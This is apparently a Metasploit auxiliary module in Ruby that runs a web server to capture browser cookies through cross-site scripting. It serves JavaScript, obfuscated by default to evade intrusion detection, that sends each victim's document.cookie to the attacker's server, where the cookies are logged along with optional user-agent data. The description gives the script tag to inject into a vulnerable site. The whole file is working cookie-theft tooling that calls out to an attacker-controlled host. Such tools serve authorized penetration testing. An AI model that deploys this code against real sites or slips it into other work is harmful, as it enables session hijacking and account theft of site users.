##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'			=> 'Capture: HTTP looging of cookies',
			'Description'	=> %q{
					This modules runs a webserver that captures cookies from clients of 
				a website vulnerable to cross site scripting. In an attemt 
				to evads IDS this module has an option to obfuscate the generated javascript.
				To use this script, the following javascript must be injected on the XSS vunlerable
				site:
				<script src="http://metasploitserver:port/whatever.js"</script>
			},
			'License'	=> MSF_LICENSE,
			'Author'	=> ['Johnny Vestergaard <jkv[at]unixcluster.dk>', 'jkv']
	))

	register_options(
		[
			OptString.new('TARGET_COOKIE', [false, "Name of cookie to dump, leave empty to dump all cookies", ""]),
			OptBool.new('OBFUSCATE_JAVASCRIPT', [true, "Enables obfuscation of javascript code", true]),
			OptBool.new('EXTRACT_USERAGENT', [true, "Extracts and logs useragent infomaton", false]),
		], self.class)
	end


	# This is the module's main runtime method
	def run
		@client_cache = {}

		# Starts Web Server
		exploit
	end

	# This handles the HTTP responses for the Web server
	def on_request_uri(cli, request)

		base_url = generate_base_url(cli, request)
		status_message = ""

		case request.uri
		when /\.js(\?|$)/
			content_type = "text/plain"
			send_response(cli, generate_js(base_url), {'Content-Type'=> content_type, })
		when /\/data\/(.*)/
			cookies = request.uri.to_s[6..-1].split(';')
			cookiesh = Hash.new()
			cookies.each do |item|	
				a,b = item.split('=')
				cookiesh[a] = b
			end
			if datastore['TARGET_COOKIE'] != ""
				target = cookiesh[datastore['TARGET_COOKIE']]
				if target != nil
					status_message = "Cookie: #{target}"
				else
					status_message = "Cookie not found"
				end
			else
				status_message = "Cookies: #{cookies.join(';')}"
			end
		#skip it - too  much noise!
		when /favicon\.ico/
		else
			status_message = "Unexpected request: #{request.method} request for #{request.uri}"
		end

	if status_message != ""
		if datastore['EXTRACT_USERAGENT']
			status_message = status_message + " [#{request['User-Agent']}"
		end
		print_status("#{cli.peerhost} - #{status_message}")
	end

	#we know nothing!
	send_not_found(cli)
	end
	
	# Figure out what our base URL is based on the user submitted
	# Host header or the address of the client.
	# This def is shamelessly stolen from the http_javascript_keylogger - thanks Marcus! :-)
	def generate_base_url(cli, req)
		port = nil
		host = Rex::Socket.source_address(cli.peerhost)

		if req['Host']
			host = req['Host']
			bits = host.split(':')

			# Extract the hostname:port sequence from the Host header
			if bits.length > 1 and bits.last.to_i > 0
				port = bits.pop.to_i
				host = bits.join(':')
			end
		else
			port = datastore['SRVPORT'].to_i
		end

		prot = (!! datastore['SSL']) ? 'https://' : 'http://'
		if Rex::Socket.is_ipv6?(host)
			host = "[#{host}]"
		end

		base = prot + host
		if not ((prot == 'https' and port.nil?) or (prot == 'http' and port.nil?))
			base << ":#{port}"
		end

		base << get_resource
	end

	def process_data(cli, request, data)

		#TODO: Log to file!

	end


	#Generation and obfuscation of javascript
	def generate_js(base_url)
		 code = ::Rex::Exploitation::JSObfu.new %Q|
				new Image().src="#{base_url}data/"+document.cookie;|
 		if datastore['OBFUSCATE_JAVASCRIPT']
			code.obfuscate
		end

		return code
	end

end
